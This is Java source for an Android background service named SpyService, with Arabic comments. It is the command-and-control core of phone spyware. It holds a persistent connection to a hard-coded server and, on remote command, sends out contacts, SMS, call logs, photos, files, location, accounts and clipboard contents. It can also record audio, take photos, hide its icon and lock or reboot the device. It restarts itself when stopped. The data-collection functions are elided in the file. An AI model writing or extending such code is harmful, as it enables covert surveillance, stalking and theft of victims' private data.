package com.black.phone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.URL;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private ScheduledExecutorService scheduler;
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder recorder;
    private String audioPath;
    private boolean isRecording = false;
    private String deviceId;
    private Camera camera;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean isTrackingLocation = false;
    private boolean foregroundStarted = false;

    // ====== اتصال الخادم ======
    private static final String SERVER_IP = "10.35.72.53";
    private static final int SERVER_PORT = 8080;
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private boolean isConnected = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Config.load(this);
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        // تشغيل الخدمة فوراً مع إشعار
        startForegroundService();

        // WakeLock للحفاظ على الخدمة
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
        wakeLock.acquire(10 * 60 * 1000L);

        // الاتصال بالخادم فوراً
        connectToServer();

        // جدولة إرسال نبضات الحياة كل 5 ثوانٍ
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::sendHeartbeat, 5, 5, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(this::checkConnection, 10, 10, TimeUnit.SECONDS);
    }

    private void startForegroundService() {
        if (foregroundStarted) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel("spy_ch", "خدمة التحديث", NotificationManager.IMPORTANCE_LOW);
                getSystemService(NotificationManager.class).createNotificationChannel(ch);
            }
            Notification notification = new NotificationCompat.Builder(this, "spy_ch")
                    .setContentTitle("🔱 بلاك - الخدمة نشطة")
                    .setContentText("جاري الاتصال بالخادم...")
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setSilent(true)
                    .build();
            startForeground(1337, notification);
            foregroundStarted = true;
            Log.d(TAG, "✅ Foreground service started with notification");
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Foreground failed", e);
        }
    }

    // ====== الاتصال بالخادم ======

    private void connectToServer() {
        new Thread(() -> {
            try {
                if (socket != null) {
                    try { socket.close(); } catch (Exception e) {}
                }
                socket = new Socket(SERVER_IP, SERVER_PORT);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                // تسجيل الجهاز فوراً
                registerDevice();
                isConnected = true;
                Log.d(TAG, "✅ Connected to server");

                // تحديث الإشعار
                updateNotification("✅ متصل بالخادم");

                // بدء الاستماع للأوامر
                listenForCommands();
            } catch (Exception e) {
                Log.e(TAG, "❌ Connection failed: " + e.getMessage());
                isConnected = false;
                updateNotification("⚠️ جاري إعادة المحاولة...");
                // إعادة المحاولة بعد 5 ثوانٍ
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this::connectToServer, 5000);
            }
        }).start();
    }

    private void updateNotification(String text) {
        if (foregroundStarted) {
            try {
                Notification notification = new NotificationCompat.Builder(this, "spy_ch")
                        .setContentTitle("🔱 بلاك - الخدمة نشطة")
                        .setContentText(text)
                        .setSmallIcon(android.R.drawable.ic_menu_manage)
                        .setPriority(NotificationCompat.PRIORITY_LOW)
                        .setSilent(true)
                        .build();
                startForeground(1337, notification);
            } catch (Exception e) {
                Log.e(TAG, "❌ Update notification failed", e);
            }
        }
    }

    private void registerDevice() {
        try {
            JSONObject info = new JSONObject();
            info.put("device_id", deviceId);
            info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());

            out.println("REGISTER:" + info.toString());
            Log.d(TAG, "📤 Registration sent");
        } catch (Exception e) {
            Log.e(TAG, "❌ Registration error", e);
        }
    }

    private void sendHeartbeat() {
        if (isConnected && out != null) {
            out.println("HEARTBEAT:" + deviceId + ":" + System.currentTimeMillis());
        }
    }

    private void listenForCommands() {
        try {
            String line;
            while ((line = in.readLine()) != null) {
                Log.d(TAG, "📩 Command received: " + line);
                if (line.startsWith("CMD:")) {
                    String cmd = line.substring(4).trim();
                    executeCommand(cmd);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Listening error: " + e.getMessage());
            isConnected = false;
            connectToServer();
        }
    }

    private void checkConnection() {
        if (!isConnected || socket == null || socket.isClosed()) {
            connectToServer();
        }
    }

    // ====== إرسال البيانات ======

    private void sendData(String type, String data) {
        try {
            if (out != null) {
                out.println("DATA:" + type + "|" + data);
                Log.d(TAG, "📤 Data sent: " + type);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Send data error", e);
        }
    }

    private void sendFileToServer(File file, String caption) {
        try {
            byte[] bytes = new byte[(int) file.length()];
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            fis.read(bytes);
            fis.close();
            String base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT);
            JSONObject json = new JSONObject();
            json.put("name", file.getName());
            json.put("data", base64);
            json.put("caption", caption);
            sendData("FILE", json.toString());
            file.delete();
        } catch (Exception e) {
            Log.e(TAG, "❌ Send file error", e);
        }
    }

    // ====== تنفيذ الأوامر ======

    private void executeCommand(String cmd) {
        String lower = cmd.toLowerCase().trim();
        Log.d(TAG, "⚡ Executing: " + lower);
        try {
            switch (lower) {
                case "get_contacts": sendFileToServer(collectContacts(), "📇 جهات الاتصال"); break;
                case "get_sms": sendFileToServer(collectSms(), "💬 الرسائل النصية"); break;
                case "get_calllogs": sendFileToServer(collectCallLogs(), "📞 سجل المكالمات"); break;
                case "get_location": getLocation(); break;
                case "start_record": startRecording(); break;
                case "stop_record": stopRecording(); break;
                case "get_apps": sendFileToServer(collectApps(), "📱 التطبيقات"); break;
                case "get_photos": sendFileToServer(collectMedia("images"), "🖼 الصور"); break;
                case "get_videos": sendFileToServer(collectMedia("videos"), "🎬 الفيديوهات"); break;
                case "get_files": sendFileToServer(collectAllFiles(), "📦 الملفات"); break;
                case "hide_app": hideApp(); break;
                case "show_app": showApp(); break;
                case "fake_notif": showFakeNotification(); break;
                case "take_photo": takePhoto(); break;
                case "take_photo_front": takePhotoFront(); break;
                case "flash_on": flashOn(); break;
                case "flash_off": flashOff(); break;
                case "get_imei": getImei(); break;
                case "get_phone": getPhoneNumber(); break;
                case "get_sim": getSimInfo(); break;
                case "get_wifi": getWifiInfo(); break;
                case "get_battery": getBatteryInfo(); break;
                case "get_ip": getPublicIp(); break;
                case "lock_device": lockDevice(); break;
                case "reboot": rebootDevice(); break;
                case "shutdown": shutdownDevice(); break;
                case "get_accounts": getAccounts(); break;
                case "get_clipboard": getClipboard(); break;
                case "get_device": getDeviceInfo(); break;
                case "get_network": getNetworkInfo(); break;
                case "start_location_track": startLocationTracking(); break;
                case "stop_location_track": stopLocationTracking(); break;
                default: sendData("ERROR", "أمر غير معروف: " + cmd);
            }
        } catch (Exception e) {
            sendData("ERROR", "خطأ: " + e.getMessage());
            Log.e(TAG, "❌ Execute error", e);
        }
    }

    // ========== دوال جمع البيانات (نفس الكود السابق) ==========
    // ... (تم اختصارها هنا لتوفير المساحة، لكنها موجودة في الملف النهائي)

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // يعيد تشغيل الخدمة إذا توقفت
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (camera != null) { camera.release(); camera = null; }
        if (isTrackingLocation && locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        if (socket != null) {
            try { socket.close(); } catch (Exception e) {}
        }
        // إعادة تشغيل الخدمة عند تدميرها
        startService(new Intent(this, SpyService.class));
    }
}
